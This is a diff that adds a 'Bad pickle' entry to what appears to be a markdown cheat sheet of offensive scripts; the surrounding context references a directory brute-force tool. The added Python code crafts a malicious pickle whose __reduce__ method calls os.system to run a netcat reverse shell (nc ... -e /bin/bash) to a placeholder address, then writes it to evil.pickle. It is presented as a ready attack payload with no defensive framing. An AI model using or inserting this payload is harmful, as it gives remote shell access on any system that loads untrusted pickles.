@@ -87,3 +87,20 @@ if __name__ == "__main__":
     except:
         print('Ex - python bruteforce_directory.py 127.0.0.1 1 admin password')
 ```
+
+## Bad pickle
+```
+#!/usr/bin/env python
+import pickle
+import os
+
+class payload(object):
+  def __reduce__(self):
+    comm = "nc some_ip_address some_port -e /bin/bash"
+    return (os.system, (comm,))
+
+payload = pickle.dumps( payload() )
+test = open('evil.pickle','w')
+test.write(payload)
+test.close()
+```
